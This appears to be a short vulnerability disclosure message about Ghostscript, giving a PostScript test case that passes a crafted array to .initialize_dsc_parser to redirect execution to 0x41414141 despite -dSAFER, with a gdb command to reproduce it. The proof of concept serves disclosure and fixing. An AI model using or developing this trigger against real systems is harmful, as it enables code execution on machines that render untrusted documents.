It was pointed out to me that my testcase doesn't work on the 9.0x
versions, because it doesn't allow encoding 64-bit integers, but it's
still exploitable.

For example, something like this should jump to 0x41414141:

$ cat test.ps
%!PS
[16#1 16#2 16#3 16#41414141 [16#4]] .initialize_dsc_parser
$ gdb -q -ex r --args gs -dSAFER -f test.ps
